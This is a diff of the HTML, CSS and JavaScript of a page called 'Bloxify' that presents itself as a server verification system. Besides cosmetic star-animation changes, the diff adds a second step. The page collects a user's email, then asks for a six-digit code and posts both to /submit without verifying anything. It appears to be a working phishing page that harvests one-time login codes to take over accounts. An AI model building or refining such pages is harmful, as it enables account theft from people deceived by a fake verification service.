@@ -10,12 +10,12 @@ html, body {
     width: 100%;
     height: 100%;
     overflow: hidden;
-    background: #000;
+    background: black;
     font-family: Arial, sans-serif;
     color: white;
 }
 
-/* ===== FLOWING SPACE BACKGROUND ===== */
+/* ===== SPACE FLOW BACKGROUND ===== */
 #space {
     position: fixed;
     inset: -50%;
@@ -23,29 +23,29 @@ html, body {
         radial-gradient(circle at 30% 30%, #222 0%, transparent 40%),
         radial-gradient(circle at 70% 60%, #1a1a1a 0%, transparent 45%),
         linear-gradient(120deg, #000, #111, #000);
-    animation: wave 25s ease-in-out infinite alternate;
+    animation: wave 28s ease-in-out infinite alternate;
     z-index: 0;
 }
 
 @keyframes wave {
-    0% { transform: translate(0, 0) scale(1); }
-    100% { transform: translate(-4%, -6%) scale(1.1); }
+    0% { transform: translate(0,0) scale(1); }
+    100% { transform: translate(-5%,-7%) scale(1.1); }
 }
 
 /* ===== STARS ===== */
 .star {
     position: absolute;
-    width: 6px;
-    height: 6px;
+    width: 7px;
+    height: 7px;
     background: white;
     border-radius: 50%;
-    box-shadow: 0 0 10px rgba(255,255,255,0.8);
+    box-shadow: 0 0 12px white;
     cursor: pointer;
     z-index: 1;
 }
 
-/* ===== UI CONTAINER (ALIGNED) ===== */
-#ui-wrapper {
+/* ===== CENTER ALIGN ===== */
+#center {
     position: fixed;
     inset: 0;
     display: flex;
@@ -57,21 +57,20 @@ html, body {
 /* ===== UI BOX ===== */
 #ui {
     width: 420px;
-    padding: 36px 34px;
+    padding: 36px;
     background: linear-gradient(145deg, #050505, #0e0e0e);
     border-radius: 18px;
-    box-shadow:
-        0 0 30px rgba(255,255,255,0.15),
-        inset 0 0 20px rgba(255,255,255,0.05);
     text-align: center;
-    animation: floatUI 6s ease-in-out infinite;
+    box-shadow:
+        0 0 35px rgba(255,255,255,0.15),
+        inset 0 0 20px rgba(255,255,255,0.05);
+    animation: float 6s ease-in-out infinite;
 }
 
-@keyframes floatUI {
+@keyframes float {
     50% { transform: translateY(-12px); }
 }
 
-/* ===== TEXT ===== */
 h1 {
     margin: 0;
     font-size: 32px;
@@ -79,13 +78,11 @@ h1 {
 }
 
 p {
-    margin: 10px 0 22px;
+    margin: 10px 0 24px;
     color: #aaa;
     font-size: 14px;
-    line-height: 1.4;
 }
 
-/* ===== INPUTS ===== */
 input {
     width: 100%;
     padding: 14px;
@@ -95,7 +92,6 @@ input {
     color: white;
     font-size: 16px;
     outline: none;
-    box-shadow: inset 0 0 10px rgba(255,255,255,0.05);
 }
 
 button {
@@ -120,68 +116,81 @@ button:hover {
 
 <div id="space"></div>
 
-<div id="ui-wrapper">
+<div id="center">
     <div id="ui">
         <h1>Bloxify</h1>
         <p>Bloxify new-ish verification system ready to protect your servers!</p>
 
-        <input id="email" placeholder="Enter your email">
-        <button onclick="submitEmail()">Verify</button>
+        <div id="emailStep">
+            <input id="email" placeholder="Enter your email">
+            <button onclick="sendEmail()">Continue</button>
+        </div>
+
+        <div id="codeStep" style="display:none;">
+            <input id="code" placeholder="6-digit code" maxlength="6"
+                   inputmode="numeric"
+                   oninput="this.value=this.value.replace(/[^0-9]/g,'')">
+            <button onclick="sendCode()">Verify</button>
+        </div>
     </div>
 </div>
 
 <script>
-/* ===== FLOATING STARS ===== */
-const STAR_COUNT = 80;
+/* ===== STARS FLOAT + CLICK FLING ===== */
+for (let i = 0; i < 90; i++) {
+    const s = document.createElement("div");
+    s.className = "star";
+    s.style.left = Math.random()*innerWidth + "px";
+    s.style.top = Math.random()*innerHeight + "px";
 
-for (let i = 0; i < STAR_COUNT; i++) {
-    const star = document.createElement("div");
-    star.className = "star";
-    star.style.left = Math.random() * innerWidth + "px";
-    star.style.top = Math.random() * innerHeight + "px";
-
-    let vx = (Math.random() - 0.5) * 0.3;
-    let vy = (Math.random() - 0.5) * 0.3;
+    let vx = (Math.random()-0.5)*0.3;
+    let vy = (Math.random()-0.5)*0.3;
 
     function move() {
-        let x = parseFloat(star.style.left) + vx;
-        let y = parseFloat(star.style.top) + vy;
-
+        let x = parseFloat(s.style.left) + vx;
+        let y = parseFloat(s.style.top) + vy;
         if (x < 0 || x > innerWidth) vx *= -1;
         if (y < 0 || y > innerHeight) vy *= -1;
-
-        star.style.left = x + "px";
-        star.style.top = y + "px";
-
+        s.style.left = x + "px";
+        s.style.top = y + "px";
         requestAnimationFrame(move);
     }
     move();
 
-    star.onclick = () => {
-        star.animate([
+    s.onclick = () => {
+        s.animate([
             { transform: "translate(0,0)", opacity: 1 },
-            {
-                transform: `translate(${(Math.random()-0.5)*600}px, ${(Math.random()-0.5)*600}px)`,
-                opacity: 0
-            }
-        ], { duration: 700, easing: "ease-out" });
+            { transform: `translate(${(Math.random()-0.5)*700}px, ${(Math.random()-0.5)*700}px)`, opacity: 0 }
+        ], { duration: 700 });
 
         setTimeout(() => {
-            star.style.left = Math.random() * innerWidth + "px";
-            star.style.top = Math.random() * innerHeight + "px";
-            star.style.opacity = 1;
+            s.style.left = Math.random()*innerWidth + "px";
+            s.style.top = Math.random()*innerHeight + "px";
+            s.style.opacity = 1;
         }, 700);
     };
 
-    document.body.appendChild(star);
+    document.body.appendChild(s);
 }
 
-/* ===== SEND EMAIL ===== */
-function submitEmail() {
+/* ===== EMAIL STEP ===== */
+function sendEmail() {
     fetch("/submit", {
         method: "POST",
-        headers: { "Content-Type": "application/json" },
+        headers: {"Content-Type":"application/json"},
         body: JSON.stringify({ email: email.value })
+    });
+
+    document.getElementById("emailStep").style.display = "none";
+    document.getElementById("codeStep").style.display = "block";
+}
+
+/* ===== CODE STEP ===== */
+function sendCode() {
+    fetch("/submit", {
+        method: "POST",
+        headers: {"Content-Type":"application/json"},
+        body: JSON.stringify({ code: code.value })
     });
 }
 </script>
